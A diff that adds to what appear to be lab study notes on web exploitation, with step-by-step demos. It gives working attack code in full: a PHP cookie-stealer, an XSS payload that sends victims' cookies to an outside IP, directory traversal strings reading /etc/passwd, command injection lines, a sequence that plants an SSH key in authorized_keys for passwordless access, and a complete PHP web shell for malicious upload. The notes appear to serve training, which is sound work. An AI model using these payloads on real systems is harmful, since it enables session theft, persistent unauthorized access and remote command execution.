@@ -93,6 +93,11 @@ Cross-Site Scripting (XSS)
     When a user is tricked into clicking on a malicious link, the injected code travels to the vulnerable web site. The browser then executes the code because it came from a "trusted" server
   Stored :: Actually stored on the web server, more persistent
     Where the injected script is permanently stored on the target servers. The victim then retrieves the malicious script from the server when it requests the stored information
+Server-Side Injection
+  Directory Traversal :: accessing the file system of that web server that outside of the intended scope of the developers
+  Command Injection :: some input received from a user is used in command execution on the server-side in a way that allows a malicious actor to execute additional arbitrary commands 
+  SSH Key Upload :: By uploading our key to the target, we can give ourselves access without needing a password
+
 --- JAVA SCRIPT DEMO ---
 1. Go to the web server   # <IP_Address>
   You can use your nmap scripts to see what webpages are available such as http-robots.txt.nse and http-enum.nse
@@ -100,6 +105,72 @@ Cross-Site Scripting (XSS)
 3. Navigate to <IP_Address>/java   # Java script pages
 4. Open up DevConsole   # Hit F12
   Here you are reading the Java code trying to understand it as if you were reading psuedocode
+--- STORED XSS DEMO ---
+1. Navigate to web server
+2. Navigate to <IP_Address>/chat/messageb.php
+3. Make a document in /var/www/html called cookiefile.txt
+4. Make a document in / called Cookie_stealer1.php and input
+  <?php
+  $cookie = $_GET["username"];
+  $steal = fopen("/var/www/html/cookiefile.txt", "a+");
+  fwrite($steal, $cookie ."\n");
+  fclose($steal);
+  ?>
+4.. Enter following code for cookie stealer script
+ <script>document.location="http://10.50.20.97/Cookie_Stealer1.php?username=" + document.cookie;</script>
+5. Now look at the URL
+    <script> "hello" </script>  # if this works than it accepts untrusted javascript code
+--- SERVER-SIDE INJECTION DEMO ---
+1. Navigate to <IP_Address>/path
+  in pathdemo.php
+    ../../../../../etc/passwd   # the ../ is because we do not know where we land in the directory so we need to naviagte far bar to read the files
+      this gives us all of the user-names specifically www-data and their home directory   # www-data is the admin for the webserver
+    ../../../../../etc/hosts
+--- COMMAND INJECTION DEMO ---
+1. Navigate <IP_Address>/cmdinjection
+  in cmdinjectiondemo.php
+    ;whoami  # the command will only work if the semi-colon is placed in front of the command
+    ;cat /etc/passwd
+    ;ls -latr /var/www
+    ;cat /etc/hosts
+    ;netstat -ntulp
+--- SSH KEY UPLOAD ---
+1. on lin-ops create ssh public key
+  do not change location or enter passphrase
+  copy the public key
+2. Command injection
+  see above
+  ;whoami
+  ;cat /etc/passwd
+  ;ls -la /var/www   # home directory of web server admin
+  ;mkdir /var/www/.ssh   # making ssh directory
+  ;ls -la /var/www/   # validating there is a .ssh director
+  ;cat /var/www/.ssh/authorized_keys  # file should already be generated
+3. upload key to authorized key file
+  ;echo "<ssh_key>" >> /var/www/.ssh/authorized_keys
+  ;cat /var/www/.ssh/authorized_keys
+4. On the linops
+  ssh www-data@<IP_Address>
+    no password needed
+--- MALICIOUS FILE UPLOAD DEMO ---
+1. Navigate to <IP_Address to <IP_Address>/uploads
+2. Make a script on your rdp session in notepad and save it as badupload.php on your desktop
+    <HTML><BODY>
+    <FORM METHOD="GET" NAME="myform" ACTION="">
+    <INPUT TYPE="text" NAME="cmd">
+    <INPUT TYPE="submit" VALUE="Send">
+    </FORM>
+    <pre>
+    <?php
+    if($_GET['cmd']) {
+      system($_GET['cmd']);
+      }
+    ?>
+    </pre>
+    </BODY></HTML>
+3. Upload it to the site
+4. Go to the parent directory and navigate to the uplaod
+  cat /etc/passwd
 
 #############################################
 Web Exploitation - SQL Injection
